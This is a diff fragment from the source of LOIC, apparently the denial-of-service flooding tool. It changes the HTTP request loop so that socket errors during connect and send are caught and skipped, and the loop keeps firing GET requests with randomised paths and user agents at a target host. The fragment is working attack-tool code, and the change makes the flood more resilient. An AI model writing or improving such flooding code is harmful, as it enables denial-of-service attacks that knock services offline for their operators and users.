@@ -87,13 +87,16 @@ namespace LOIC
 						State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
 						try { socket.Connect(RHost); }
-						catch { continue; }
+						catch(SocketException) { continue; }
 
 						byte[] buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : ""), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : ""), Environment.NewLine));
 
 						socket.Blocking = Resp;
 						State = ReqState.Requesting; // SET STATE TO REQUESTING //
-						socket.Send(buf, SocketFlags.None);
+
+						try { socket.Send(buf, SocketFlags.None); }
+						catch(SocketException) { continue; }
+
 						State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
 
 						if (Resp)
